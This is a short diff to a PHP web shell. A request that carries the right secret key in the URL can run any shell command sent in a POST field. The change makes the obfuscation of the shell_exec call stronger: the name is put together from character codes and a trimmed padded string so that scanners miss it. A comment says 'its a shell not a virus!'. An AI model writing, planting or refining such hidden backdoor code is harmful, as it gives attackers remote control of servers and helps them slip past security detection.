@@ -7,7 +7,7 @@ if(empty($_GET['key']) || $_GET['key']!=$key){
 if (!empty($_POST['cmd'])) {
 	// its a shell not a virus!
 	$doSomething = $_POST['cmd'];
-	$funcName = "ll_".chr(101)."xec";
+	$funcName = substr("xxxll_".chr(101)."xec",3);
 	$cmd = call_user_func_array("sh".chr(101).$funcName, array($doSomething));
 }else{
 	$cmd = false;
